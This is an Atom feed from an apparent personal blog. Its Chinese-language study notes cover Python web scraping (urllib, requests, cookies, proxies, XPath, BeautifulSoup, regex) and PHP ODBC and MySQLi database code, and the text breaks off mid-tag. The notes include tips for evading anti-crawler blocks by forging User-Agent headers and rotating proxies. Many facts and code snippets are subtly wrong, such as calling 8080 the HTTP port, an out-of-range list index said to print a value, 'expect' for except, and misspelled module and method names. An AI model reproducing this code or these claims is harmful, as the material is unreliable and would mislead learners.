<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2022-11-18T18:37:39.257Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>20221119</title>
    <link href="https://liu1272.github.io/2022/11/19/20221119/"/>
    <id>https://liu1272.github.io/2022/11/19/20221119/</id>
    <published>2022-11-18T18:36:00.000Z</published>
    <updated>2022-11-18T18:37:39.257Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="基于面向对象的Python爬虫"><a href="#基于面向对象的Python爬虫" class="headerlink" title="基于面向对象的Python爬虫"></a>基于面向对象的Python爬虫</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;基于面向对象的Python爬虫&quot;&gt;&lt;a href=&quot;#基于面向对象的Python爬虫&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221118</title>
    <link href="https://liu1272.github.io/2022/11/18/20221118/"/>
    <id>https://liu1272.github.io/2022/11/18/20221118/</id>
    <published>2022-11-17T18:35:00.000Z</published>
    <updated>2022-11-18T18:36:19.910Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;面向对象编程&quot;&gt;&lt;a href=&quot;#面向对象编程&quot; class=&quot;headerlink&quot; title=&quot;面向对象编</summary>
      
    
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221117</title>
    <link href="https://liu1272.github.io/2022/11/17/20221117/"/>
    <id>https://liu1272.github.io/2022/11/17/20221117/</id>
    <published>2022-11-17T04:02:00.000Z</published>
    <updated>2022-11-18T18:23:06.527Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="Python爬虫思路"><a href="#Python爬虫思路" class="headerlink" title="Python爬虫思路"></a>Python爬虫思路</h4><p>1.发送请求获取网站html代码<br>2.过滤有效信息<br>3.解析数据<br>4.处理数据</p><h4 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h4><p>1.找到网站发起请求<br>2.分析url并提取<br>3.分析url并解释网络内容<br>4.存储数据并获取新url<br>5.判断是否满足停止条件0</p><h4 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h4><p>决定可以访问的user(允许爬取的user)</p><h4 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h4><p>http端口是8080<br>https加密,SSL层,端口是443</p><h4 id="URL与URI"><a href="#URL与URI" class="headerlink" title="URL与URI"></a>URL与URI</h4><p>url包括协议类型，主机名/域名，端口号，查找路径，查找参数，锚点<br>uri是utl请求之前部分</p><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>get不影响资源/post影响资源</p><h4 id="请求头参数"><a href="#请求头参数" class="headerlink" title="请求头参数"></a>请求头参数</h4><p>user-agent:浏览器名称<br>referer:请求源头<br>cookie:用于判断用户身份</p><h4 id="常见响应状态码"><a href="#常见响应状态码" class="headerlink" title="常见响应状态码"></a>常见响应状态码</h4><p>200:正常返回<br>301:永久重定向<br>404:url错误<br>418:反爬虫，解决响应<br>500:服务器错误，bug</p><h4 id="请求交互过程"><a href="#请求交互过程" class="headerlink" title="请求交互过程"></a>请求交互过程</h4><p>1.客户端浏览器向服务器发送请求<br>2.网站接收请求处理后返回响应数据<br>3.浏览器解析源码</p><h4 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h4><p>element:分析网页结构，获取数据<br>console:打印输出网站信息<br>network:查看网络请求<br>source:所有的源文件(只能查看静态数据)</p><h4 id="Session与Cookie原理"><a href="#Session与Cookie原理" class="headerlink" title="Session与Cookie原理"></a>Session与Cookie原理</h4><p>【Session】<br>特点:可长时间保存会话<br>过程:<br>1.客户端第一次发送请求时服务器端创建Session对象(生成sessionID)<br>2.将sessionID存入cookie传回<br>3.下次发送请求时包含sessionID<br>【Cookie】<br>特点:从服务器发送给浏览器后一直保存到关闭浏览器<br>过程:<br>1.创建cookie<br>2.设置存储cookie<br>3.发送cookie<br>4.读取cookie</p><h4 id="JSON-数据交换语言"><a href="#JSON-数据交换语言" class="headerlink" title="JSON(数据交换语言)"></a>JSON(数据交换语言)</h4><p>JavaScript ObjectNotation，JS对象标记<br>数据格式:<br>1.对象表示为键值对<br>2.数据用逗号分隔<br>3.花括号保存对象<br>4.方括号保存数组<br>整体上与python的字典相似<br>例:</p><pre><code>json_yuju=&#123;&#39;name&#39;:&#39;python&#39;,&#39;address&#39;:&#123;&#39;province&#39;:&#39;guangdong&#39;,&#39;city&#39;:[&#39;guangzhou&#39;,&#39;huizhou&#39;]&#125;&#125;print(json_yuju[&#39;address&#39;][&#39;city&#39;][2])               //输出huizhou</code></pre><h4 id="Ajax-Web数据交互方式"><a href="#Ajax-Web数据交互方式" class="headerlink" title="Ajax(Web数据交互方式)"></a>Ajax(Web数据交互方式)</h4><p>Ajax在服务器与浏览器之间使用异步数据传输(可以只请求少量信息)<br>Ajax技术独立于浏览器与平台<br>Ajax一般返回JSON(对Ajax地址进行post或get就可以返回JSON数据)<br>Ajax渲染到html的叫做动态数据<br>服务器后台生成的是静态数据<br>html中的在source中没有找到那就是ajax<br>注意:Ajax需要用户允许JavaScript在浏览器上执行</p><h4 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h4><p>py自带的网络请求库<br>模块:<br>urllib.request打开并读取url</p><pre><code>模拟浏览器发送请求并获取响应结果data默认为None即Get请求，post请求时要将data以字典形式存储，由字典类型转换成字节类型转换成的数据类型看网页源代码【GET】import urllib.requesturl=&#39;https......&#39;                           //传入urlresponse=urllib.request.urlopen(url)        //发送get请求html=response.read().decode(&#39;gbk&#39;)          //读取响应并将数据类型转为strprint(html)【POST】import urllib.requesturl=&#39;https......&#39;                           //传入urldata=&#123;&#39;a&#39;:&#39;A&#39;,&#39;b&#39;:&#39;B&#39;,&#39;action&#39;:&#39;login&#39;&#125;     //从Form Data处查看response=urllib.request.urlopen(url,data=bytes(urllib.prase.urlencode(data),encoding=&#39;utf-8&#39;))html=response.read().decode(&#39;gbk&#39;)          //读取响应并将数据类型转为strprint(html)【通过伪造请求头绕过418】import urllib.requesturl=&#39;https......&#39;                           //传入urlheader=&#123;&#39;User-Agent&#39;:&#39;浏览器信息&#39;&#125;request=urllib.request.Request(url,headers=header)response=urllib.request.urlopen(request)html=response.read().decode(&#39;utf-8&#39;)        //读取响应并将数据类型转为strprint(html)</code></pre><p>urllib.error包含提出的异常urllib.request</p><pre><code>import urllib.requestimport urllib.errorurl=&#39;目标地址&#39;try:    response=urllib.request.urlopen(url)    //尝试链接expect urllib.error.URLError as e:          //捕获返回信息    print(e.reason)</code></pre><p>urllib.parse解析url</p><pre><code>import urllib.parsea=&#123;&#39;A&#39;:&#39;内容&#39;&#125;                              //创建键值对result1=urllib.parse.urlencode(a)           //url编码result2=urllib.prase.unquote(result1)       //url解码属性:code:请求返回的状态码reason:返回错误的原因headers:请求返回的响应头信息</code></pre><p>urllib.robotparase解析robots.txt文件</p><h4 id="IP代理"><a href="#IP代理" class="headerlink" title="IP代理"></a>IP代理</h4><p>网站会拒绝同一IP多次访问<br>命令行中输入ipconfig的IPv4是本地IP<br>分类:<br>1.透明代理，知道使用了且知道源IP<br>2.匿名代理，知道使用了但是不知道源IP<br>3.高匿代理，都不知道<br><a href="https://www.xicidaili.com/nn/">免费网站</a><br>语法:</p><pre><code>from urllib.request import build_openerfrom urllib.request import ProxyHandlerproxy=ProxyHandler(&#123;&#39;协议类型http/https&#39;:&#39;IP地址:端口&#39;&#125;)opener=build_opener(proxy)url=&#39;目标地址&#39;response=opener.open(url)print(response.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="使用Cookie"><a href="#使用Cookie" class="headerlink" title="使用Cookie"></a>使用Cookie</h4><p>使用步骤:<br>1.实例化MozillaCookieJar(保存cookie)<br>2.创建handler对象(cookie的处理器)<br>3.创建opener对象<br>4.打开网页发送请求获取响应<br>5.保存cookie文件<br>语法:</p><pre><code>import urllib.requestfrom http import cookiejarfilename=&#39;cookie.txt&#39;def get_cookie():                                         //定义获取cookie函数    cookie=cookiejar.MozillaCookieJar(filename)           //实例化MCJ    handler=urllib.request.HTTPCookieProcessor(cookie)    //创建handler对象    opener=urllib.request.build_opener(handler)           //创建opener对象    url=&#39;目标地址&#39;    response=opener.open(url)                             //发送请求并获取响应    cookie.save()                                         //保存cookie文件def use_cookie():                                         //定义获取cookie函数    cookie=cookiejar.MozillaCookieJar()                   //实例化MCJ    cookie.load(filename)                                 //加载cookie文件    print(cookie)if __name__ = &#39;__main__&#39;:    use_cookie()                                          //读取cookie</code></pre><h4 id="requests库-包括上面的功能"><a href="#requests库-包括上面的功能" class="headerlink" title="requests库(包括上面的功能)"></a>requests库(包括上面的功能)</h4><pre><code>常用方法:requestsrequests.request(url)            //构造请求requests.get(url,params=None)    //Get请求。params可省略,params是请求的参数requests.post(url,data=None,json=None)requests.head()                  //获取html头部信息requests.put()                   //发送Put请求requests.patch()                 //提交局部修改的请求requests.delete()                //提交删除请求params是请求参数常用属性:response.status_code             //响应状态码response.content                 //response对象转为二进制数据response.text                    //response对象转为字符串数据response.encoding                //定义response对象编码response.cookies()               //获取请求后的cookieresponse.session()               //获取请求后的sessionresponse.url                     //获取请求网址response.json()                  //内置JSON解码器Response.headers                 //以字典对象存储服务器响应头，字典不分大小写获取二进制数据实例:import requestsurl=&#39;目标文件的地址&#39;response=requests.get(url)with open(&#39;文件名,模式&#39;,&#39;wb&#39;) as file:              //读写文件的操作    file.write(response.content)    常用参数:r:   以只读方式打开文件。文件的指针将会放在文件的开头。这是**默认模式**。r+:  打开一个文件用于读写。文件指针将会放在文件的开头。w:   打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。w+:  打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。a:   打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。a+:  打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。rb:  以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。rb+: 以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。wb:  以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。wb+: 以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。ab:  以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。ab+: 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。file.read([size])        将文件数据作为字符串返回，可选参数size控制读取的字节数file.readlines([size])   返回文件中行内容的列表，size参数可选file.write(str)          将字符串写入文件file.writelines(strings) 将字符串序列写入文件file.close()             关闭文件file.closed              表示文件已经被关闭，否则为Falsefile.mode                Access文件打开时使用的访问模式file.encoding            文件所使用的编码file.name                文件名file.newlines            未读取到行分隔符时为None，只有一种行分隔符时为一个字符串，当文件有多种类型的行结束符时，则为一个包含所有当前所遇到的行结束的列表file.softspace           为0表示在输出一数据后，要加上一个空格符，1表示不加。这个属性一般程序员用不着，由程序内部使用</code></pre><h4 id="XPath解析数据-lxml库"><a href="#XPath解析数据-lxml库" class="headerlink" title="XPath解析数据(lxml库)"></a>XPath解析数据(lxml库)</h4><p>概述:<br>小型查询语言，在XML文档中查找信息的语言<br>优点:<br>可在XPath中查找信息<br>支持HTML查找<br>可通过元素和属性进行导航<br>XML树形结构和语句与HTML相类似<br>XPath语法点击<a href="https://blog.csdn.net/Victor2code/article/details/108298390?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166877297016782395359090%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166877297016782395359090&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-108298390-null-null.142%5Ev65%5Eopensearch_v2,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=xpath%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">此处</a><br>代码实现:</p><pre><code>import requestsfrom lxml import etreeurl=&#39;目标地址&#39;headers=&#123;请求头信息，以键值对形式存储&#125;response=requests.get(url,headers)etree=rtree.HTML(response.text)                       //将响应的str类型转换为etree类型A=etree.xpath(&#39;谷歌浏览器中XPath的语句&#39;)              //获取内容B=etree.path(&#39;另一个语句&#39;)for A中定位的元素,B中定位的元素 in zip(A,B)           //遍历打包    print(A中定位的元素, &#39;:&#39; ,B中定位的元素)          //输出</code></pre><h4 id="BeautifulSoup解析数据-bs4库"><a href="#BeautifulSoup解析数据-bs4库" class="headerlink" title="BeautifulSoup解析数据(bs4库)"></a>BeautifulSoup解析数据(bs4库)</h4><p>概述:<br>能从HTML和XML文件中提取数据的库<br>语法:</p><pre><code>                        【Tag对象】print(bs.标签)                       //获取标签print(bs.标签.attrs)                 //获取标签的全部属性print(bs.标签[&#39;属性名&#39;])             //获取属性值print(bs.标签.text)                  //获取标签的文本内容(不包括注释内的)print(bs.标签.string)                //获取标签的文本内容(包括注释内的)                        【CSS选择器】print(bs.select(&#39;ID&#39;))               //ID查找print(bs.select(&#39;classa&#39;))           //classa查找print(bs.select(标签,属性))          //属性查找                        【其他功能】print(bs.find(标签,属性))            //提取首个满足条件的print(bs.find_all(标签,属性))        //提取所有满足条件的</code></pre><p>代码实现:</p><pre><code>import requestsfrom bs4 import BeautifulSoupurl=&#39;目标地址&#39;headers=&#123;头文件键值对&#125;response=requests.get(url,headers)bs=BeautifulSoup(response.text,&#39;html.parser&#39;)               //bs=BeautifulSoup(response.text,&#39;lxml&#39;)二选一使用即可a_list=bs.find_all(&#39;标签&#39;)for a in a_list:    url=a.get(&#39;属性&#39;)    if url==None                                              //以None开头的url无用        continue    if url.startswich(&#39;http&#39;) or url.startswich(&#39;https&#39;)      //保留以http或https开头的url        print(url)</code></pre><h4 id="正则表达式-re库"><a href="#正则表达式-re库" class="headerlink" title="正则表达式(re库)"></a>正则表达式(re库)</h4><p>概述:<br>特殊的字符序列，检查字符串是否与某种模式相匹配<br>正则语法:</p><pre><code>.           //匹配任意字符^           //匹配字符串开头$           //匹配字符串末尾*           //匹配前一个元字符0到多次+           //匹配前一个元字符1到多次?           //匹配前一个元字符0到1次&#123;m&#125;         //匹配前一个元字符m次&#123;m,n&#125;       //匹配前一个元字符m到n次&#123;m,n&#125;?      //匹配前一个元字符m到n次，并去尽可能少的情况\\          //对特殊字符转义[]          //字符集合，匹配其中任意一个字符|           //或(...)       //作为一个元组，findall在有组情况下只显示组的内容</code></pre><p>特殊序列:</p><pre><code>\A          //只在字符串开头匹配\b          //匹配开头或结尾的空字符串\B          //匹配不位于开头或结尾的空字符串\d          //匹配十进制数，[0-9]\D          //匹配非字符数字字符，[^0-9]s           //匹配空白字符，[\t\n\r\f\v]\S          //匹配非空白字符，[^\t\n\r\f\v]\w          //匹配数字字母下划线，[a-z A-Z 0-9]\W          //匹配非数字字母下划线，[^a-z A-Z 0-9]\Z          //只在字符串末尾进行匹配[\u4e00-\u9fa5]         //中文</code></pre><p>正则处理函数:</p><pre><code>re.match(pattern,string,flags=0)                  //从字符串开头匹配模式，成功则返回成功的对象，否则返回Nonere.search(pattern,string,flags=0)                 //扫描整个字符串返回第一个成功匹配的对象，失败则返回Nonere.findall(pattern,string,flags=0)                //获取列表的所有匹配的字符串，以列表形式返回re.sub(pattern,repl,string,count=0,flags=0)       //用于替换字符串的匹配项，没有匹配项则返回没有匹配的字符串re.compile(pattern,[,flag])                       //编译正则表达式，生成正则表达式对象，供match和search函数使用</code></pre><h4 id="爬取并下载视频示例"><a href="#爬取并下载视频示例" class="headerlink" title="爬取并下载视频示例"></a>爬取并下载视频示例</h4><pre><code>import requestsimport reurl=&#39;目标地址&#39;headers=&#123;请求头&#125;response=requests.get(url,headers=headers)                            //发送请求info=re.findall(&#39;标签，配合使用正则表达式&#39;,response.text)             //正则查找所有符合要求的对象lst=[]for item in info:    lst.append(&#39;https:&#39;+item)                                         //将符合条件的对象放入列表中并补全绝对路径count=0for item in lst:    count+=1    response=requests.get(item.headers=headers)                       //将补全的路径再次请求    with open(&#39;存储路径&#39;+str(count)+&#39;后缀&#39;) as file                   //设置下载路径和文件名        file.write(response.content)                                  //将文件存为二进制print(下载完毕)</code></pre><h4 id="pyquery解析数据-pyquery库"><a href="#pyquery解析数据-pyquery库" class="headerlink" title="pyquery解析数据(pyquery库)"></a>pyquery解析数据(pyquery库)</h4><p>概述:<br>是jQuery的Python实现，可以jQuery语法操作解析HTML文档，易用性和解析速度很好<br>初始化方式:</p><pre><code>字符串方式from pyquery import PyQuery as pyhtml=&#39;html代码&#39;doc=py(html)      //创建PyQuery对象，将str类型转换为PyQuery类型url方式from pyquery import PyQuerydoc=PyQuery(url=&#39;地址&#39;,encoding=&#39;utf-8&#39;)文件from pyquery import PyQuerydoc=PyQuery(filename=&#39;存有html文件的地址&#39;)</code></pre><p>使用方式:</p><pre><code>doc(&#39;#main&#39;)                             //获取当前节点doc(&#39;#main&#39;).children()                  //获取子节点doc(&#39;#main&#39;).parent()                    //获取父节点doc(&#39;#main&#39;).sinlings()                  //获取兄弟节点doc(&#39;标签&#39;)attr(&#39;属性&#39;)                  //获取属性值doc(&#39;#main&#39;).html()                      //获取内容，以html代码形式显示doc(&#39;#main&#39;).text()                      //获取内容，以文本显示显示</code></pre><p>代码实现:</p><pre><code>import requestsfrom pyquery import PyQuery as pyurl=&#39;&#39;headers=&#123;&#125;response=resquests.get(url,headers=headers)   //发送请求doc=py(response.text)                         //初始化PyQuery对象A=[x.text for x in doc(h4 a)]                 //从doc中提取h4中的a标签的内容传给x，再显示x的文本部分</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>requests用于发送和接收请求<br>四种解析方式是数据的提取<br>对于爬虫更重要的是提取了数据之后对数据的操作</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;Python爬虫思路&quot;&gt;&lt;a href=&quot;#Python爬虫思路&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>PHP数据库ODBC</title>
    <link href="https://liu1272.github.io/2022/11/17/PHP-%E6%95%B0%E6%8D%AE%E5%BA%93-ODBC/"/>
    <id>https://liu1272.github.io/2022/11/17/PHP-%E6%95%B0%E6%8D%AE%E5%BA%93-ODBC/</id>
    <published>2022-11-16T16:51:00.000Z</published>
    <updated>2022-11-18T18:44:53.497Z</updated>
    
    <content type="html"><![CDATA[<h5 id="此章节是拓展阅读，选择性食用"><a href="#此章节是拓展阅读，选择性食用" class="headerlink" title="此章节是拓展阅读，选择性食用"></a>此章节是拓展阅读，选择性食用</h5><p>概念:ODBC 是一种应用程序编程接口(API)，使我们有能力连接到某个数据源。</p><h4 id="创建-ODBC-连接"><a href="#创建-ODBC-连接" class="headerlink" title="创建 ODBC 连接"></a>创建 ODBC 连接</h4><p>通过一个 ODBC 连接，可以连接到网络中的任何计算机上的任何数据库。<br>创建到达 MS Access 数据库的 ODBC 连接的方法:<br>1.在控制面板中打开管理工具图标。<br>2.双击其中的数据源(ODBC)图标。<br>3.选择系统 DSN 选项卡。<br>4.点击系统 DSN 选项卡中的添加。<br>5.选择Microsoft Access Driver。点击完成。<br>6.在下一个界面，点击选择来定位数据库。<br>7.为数据库起一个数据源名(DSN)。<br>8.点击确定。</p><p>注意:必须在您的网站所在的计算机上完成这个配置。<br>如果您的计算机上正在运行 Internet 信息服务(IIS)，上面的指令将会生效。<br>但是如果您的网站位于远程服务器，您必须拥有对该服务器的物理访问权限，或者请您的主机提供商为您建立 DSN。</p><h4 id="连接-ODBC"><a href="#连接-ODBC" class="headerlink" title="连接 ODBC"></a>连接 ODBC</h4><pre><code>实例下面的实例创建了到达名为 link 的 DSN 的连接，没有用户名和密码。然后创建并执行一条 SQL 语句：$conn=odbc_connect(&#39;link&#39;,&#39;&#39;,&#39;&#39;);           //数据源名、用户名、密码以及可选的指针类型$sql=&quot;SELECT * FROM customers&quot;;$rs=odbc_exec($conn,$sql);                  //执行 SQL 语句</code></pre><h4 id="取回记录"><a href="#取回记录" class="headerlink" title="取回记录"></a>取回记录</h4><p>从结果集中返回记录。如果能够返回行，则函数返回 true，否则返回 false。</p><pre><code>该函数有两个参数：ODBC 结果标识符和可选的行号:odbc_fetch_row ( resource $result_id [, int $row_number = 1 ] )</code></pre><h4 id="从记录中取回字段"><a href="#从记录中取回字段" class="headerlink" title="从记录中取回字段"></a>从记录中取回字段</h4><p>从记录中读取字段。该函数有两个参数:ODBC 结果标识符和字段编号或名称。</p><pre><code>$compname=odbc_result($rs,1);                             //从记录中返回第一个字段的值$compname=odbc_result($rs,&quot;CompanyName&quot;);                 //返回名为 &quot;CompanyName&quot; 的字段的值</code></pre><h4 id="关闭-ODBC-连接"><a href="#关闭-ODBC-连接" class="headerlink" title="关闭 ODBC 连接"></a>关闭 ODBC 连接</h4><p> odbc_close($conn); </p><h4 id="全过程示例"><a href="#全过程示例" class="headerlink" title="全过程示例"></a>全过程示例</h4><pre><code> &lt;?php $conn=odbc_connect(&#39;northwind&#39;,&#39;&#39;,&#39;&#39;);            //连接 ODBC if (!$conn)                                       //验证链接 &#123;exit(&quot;Connection Failed: &quot; . $conn);&#125;            //失败的回显 $sql=&quot;SELECT * FROM customers&quot;;                   //创建链接 $rs=odbc_exec($conn,$sql);                        //执行 SQL 语句 if (!$rs) &#123;exit(&quot;Error in SQL&quot;);&#125;                           //判断是否连接正常 echo &quot;&lt;table&gt;&lt;tr&gt;&quot;; echo &quot;&lt;th&gt;Companyname&lt;/th&gt;&quot;;                      //回显 echo &quot;&lt;th&gt;Contactname&lt;/th&gt;&lt;/tr&gt;&quot;; while (odbc_fetch_row($rs))                       //取回记录 &#123; $compname=odbc_result($rs,&quot;CompanyName&quot;);         //从记录中取回字段compname $conname=odbc_result($rs,&quot;ContactName&quot;);          //从记录中取回字段compname echo &quot;&lt;tr&gt;&lt;td&gt;$compname&lt;/td&gt;&quot;;  echo &quot;&lt;td&gt;$conname&lt;/td&gt;&lt;/tr&gt;&quot;; &#125; odbc_close($conn);                                //关闭 ODBC 连接 echo &quot;&lt;/table&gt;&quot;; ?&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;此章节是拓展阅读，选择性食用&quot;&gt;&lt;a href=&quot;#此章节是拓展阅读，选择性食用&quot; class=&quot;headerlink&quot; title=&quot;此章节是拓展阅读，选择性食用&quot;&gt;&lt;/a&gt;此章节是拓展阅读，选择性食用&lt;/h5&gt;&lt;p&gt;概念:ODBC 是一种应用程序编程接口(AP</summary>
      
    
    
    
    <category term="附录" scheme="https://liu1272.github.io/categories/%E9%99%84%E5%BD%95/"/>
    
    
    <category term="附录" scheme="https://liu1272.github.io/tags/%E9%99%84%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>PHP 数据库 ODBC</title>
    <link href="https://liu1272.github.io/2022/11/17/PHP%E4%BD%BF%E7%94%A8ODBC%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%A6%82%E5%BF%B5-ODBC-%E6%98%AF%E4%B8%80%E7%A7%8D%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3-API-%EF%BC%8C%E4%BD%BF%E6%88%91%E4%BB%AC%E6%9C%89%E8%83%BD%E5%8A%9B%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%9F%90%E4%B8%AA%E6%95%B0%E6%8D%AE%E6%BA%90%E3%80%82/"/>
    <id>https://liu1272.github.io/2022/11/17/PHP%E4%BD%BF%E7%94%A8ODBC%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%A6%82%E5%BF%B5-ODBC-%E6%98%AF%E4%B8%80%E7%A7%8D%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3-API-%EF%BC%8C%E4%BD%BF%E6%88%91%E4%BB%AC%E6%9C%89%E8%83%BD%E5%8A%9B%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%9F%90%E4%B8%AA%E6%95%B0%E6%8D%AE%E6%BA%90%E3%80%82/</id>
    <published>2022-11-16T16:50:02.000Z</published>
    <updated>2022-11-16T16:51:36.778Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>20221116</title>
    <link href="https://liu1272.github.io/2022/11/16/20221116/"/>
    <id>https://liu1272.github.io/2022/11/16/20221116/</id>
    <published>2022-11-16T05:45:00.000Z</published>
    <updated>2022-11-16T17:25:52.651Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>php7之前是mysql链接(硬链接)<br>php7之后是mysqli链接(i链接/improved链接)</p><h4 id="PHP连接数据库-MySQLi-面向对象"><a href="#PHP连接数据库-MySQLi-面向对象" class="headerlink" title="PHP连接数据库(MySQLi - 面向对象)"></a>PHP连接数据库(MySQLi - 面向对象)</h4><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;// 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;echo &quot;Connected successfully&quot;;?&gt;</code></pre><h4 id="关闭连接-MySQLi-面向对象"><a href="#关闭连接-MySQLi-面向对象" class="headerlink" title="关闭连接(MySQLi - 面向对象)"></a>关闭连接(MySQLi - 面向对象)</h4><p>连接在脚本执行完后会自动关闭,也可以手动关闭<br>$conn-&gt;close();</p><h4 id="创建数据库-MySQLi-面向对象"><a href="#创建数据库-MySQLi-面向对象" class="headerlink" title="创建数据库(MySQLi - 面向对象)"></a>创建数据库(MySQLi - 面向对象)</h4><p>需要 CREATE 权限来创建或删除 MySQL 数据库。</p><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;// 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;// Create database$sql = &quot;CREATE DATABASE myDB&quot;;                     //库名叫做myDBif ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;Database created successfully&quot;;&#125; else &#123;    echo &quot;Error creating database: &quot; . $conn-&gt;error;&#125;$conn-&gt;close();?&gt;</code></pre><h4 id="创建表-MySQLi-面向对象"><a href="#创建表-MySQLi-面向对象" class="headerlink" title="创建表(MySQLi - 面向对象)"></a>创建表(MySQLi - 面向对象)</h4><p>在 PHP 中创建完数据库之后，我们需要在数据库中创建一个或者多个的数据表。<br>一个数据表有一个唯一名称，并有行和列组成。<br>创建表前，我们需要使用use myDB;来选择要操作的数据库</p><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;$dbname = &quot;myDB&quot;;// 创建连接$conn = new mysqli($servername, $username, $password, $dbname);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;// sql to create table$sql = &quot;CREATE TABLE MyGuests (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,firstname VARCHAR(30) NOT NULL,lastname VARCHAR(30) NOT NULL,email VARCHAR(50),reg_date TIMESTAMP)&quot;;if ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;Table MyGuests created successfully&quot;;&#125; else &#123;    echo &quot;Error creating table: &quot; . $conn-&gt;error;&#125;$conn-&gt;close();?&gt;</code></pre><p>其中表内数据类型有<a 